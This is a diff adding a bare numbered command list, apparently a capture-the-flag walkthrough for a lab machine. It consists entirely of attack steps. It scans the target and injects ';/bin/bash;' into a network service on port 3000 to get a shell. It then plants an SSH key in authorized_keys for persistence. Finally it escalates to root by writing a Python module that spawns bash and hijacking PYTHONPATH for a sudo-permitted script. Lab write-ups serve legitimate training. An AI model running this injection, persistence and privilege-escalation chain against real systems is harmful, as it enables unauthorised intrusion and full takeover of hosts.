@@ -1,0 +1,21 @@
+1 - nmap -A 10.10.135.219
+2 - nc 10.10.135.219 3000 -> [REPORT] -> ';/bin/bash;'
+3 - cat /home/wes/user.txt
+4 - cat ~/.ssh/id_rsa.pub
+5 - cat > /home/wes/.ssh/authorized_keys << EOF
+PASTE YOUR ID_RSA.PUB
+
+6 - ssh wes@10.10.135.219
+7 - sudo -l 
+8 - find / -type f -name "compare.py" 2>/dev/null
+9 - cat > compare.py << EOF
+
+import os
+os.system("/bin/bash")
+EOF
+
+10 - chmod +x compare.py
+11 - export PYTHONPATH=/tmp:$PYTHONPATH
+12 - sudo /usr/bin/python3 /opt/development/test_module.py
+13 - whoami
+14 - cat /root/root.txt
